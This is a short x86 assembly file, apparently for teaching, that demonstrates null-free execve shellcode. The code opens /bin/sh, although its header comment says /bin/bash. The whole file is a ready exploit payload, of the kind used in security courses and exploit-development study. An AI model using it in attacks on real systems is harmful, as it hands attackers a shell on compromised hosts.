; shellcode.asm 
; Author: Mutti K
; Purpose: Demonstration of simple execve shellcode which spawns /bin/bash
; Note: Null free shellcode.

global _start

section .text

_start:
	; execve()
    xor eax,eax ; zero out
    ;create string on stack /bin/sh
    mov edx, eax ; Param 3, null
    mov ecx, eax ; Param 2, null
    push eax ; null terminate shell string
    push 0x68732f2f ; hs//
    push 0x6e69622f ; nib/
    mov ebx, esp ; Param 1 store pointer to string
	mov al, 0xb ; execve()
	int 0x80
